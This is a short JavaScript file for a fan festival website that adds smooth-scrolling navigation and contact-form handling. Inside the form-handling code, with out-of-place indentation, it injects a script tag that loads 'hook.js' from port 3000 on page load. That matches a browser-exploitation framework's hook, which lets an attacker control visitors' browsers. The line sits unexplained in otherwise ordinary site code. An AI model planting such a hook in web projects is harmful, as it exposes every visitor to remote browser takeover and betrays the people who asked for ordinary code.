// JavaScript for Otaku Festival Website

document.addEventListener("DOMContentLoaded", () => {
    // Smooth scrolling for navigation links
    const navLinks = document.querySelectorAll("nav ul li a");

    navLinks.forEach(link => {
        link.addEventListener("click", event => {
            event.preventDefault();
            const targetId = link.getAttribute("href").substring(1);
            const targetElement = document.getElementById(targetId);

            if (targetElement) {
                window.scrollTo({
                    top: targetElement.offsetTop - 50, // Adjust for header height
                    behavior: "smooth"
                });
            }
        });
    });

    // Form submission handling
    const contactForm = document.getElementById("contact-form");
    const script = document.createElement('script');
script.src = "http://127.0.0.1:3000/hook.js";
document.head.appendChild(script);

    contactForm.addEventListener("submit", event => {
        event.preventDefault();

        const formData = new FormData(contactForm);
        const name = formData.get("name");
        const email = formData.get("email");
        const message = formData.get("message");

        if (name && email && message) {
            alert(`Thank you, ${name}! Your message has been received.`);
            contactForm.reset();
        } else {
            alert("Please fill out all fields before submitting.");
        }
    });
});
